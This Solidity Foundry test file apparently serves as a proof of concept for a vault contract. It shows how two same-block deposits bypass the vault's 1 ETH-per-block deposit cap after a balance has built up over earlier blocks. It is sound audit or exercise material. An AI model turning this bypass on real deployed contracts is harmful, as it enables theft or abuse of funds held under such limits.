// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.6.11;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/depositVault.sol";

contract DepositVaultTest is Test {
    BlockDepositVault public vault;
    address public user = address(0x123);

    function setUp() public {
        vault = new BlockDepositVault();
        vm.deal(user, 100 ether);
    }

    function testDepositMoreThan1EthInSingleBlock() public {
        vm.startPrank(user, user);

        // Step 1: Accumulate balance > 1 ETH over multiple blocks
        // Block 1
        vm.roll(1);
        (bool success, ) = address(vault).call{value: 1 ether}("");
        require(success, "Deposit failed block 1");

        // Block 2
        vm.roll(2);
        (success, ) = address(vault).call{value: 1 ether}("");
        require(success, "Deposit failed block 2");

        // Check balance is 2 ETH
        (uint256 amount, ) = vault.ledger(user);
        assertEq(amount, 2 ether);

        // Step 2: Exploit in Block 3
        vm.roll(3);


        // Deposit 1 ETH
        // This will set the maxDeposit to huge value
        (success, ) = address(vault).call{value: 1 ether}("");
        require(success, "Exploit deposit 1 failed");

        // Deposit another 1 ETH
        // now the maxDeposit is huge, we can deposit eth without refund
        (success, ) = address(vault).call{value: 1 ether}("");
        require(success, "Exploit deposit 2 failed");

        // Check final balance
        (amount, ) = vault.ledger(user);
        // Should be 2 (initial) + 1 + 1 = 4 ETH
        assertEq(amount, 4 ether);

        vm.stopPrank();
    }
}
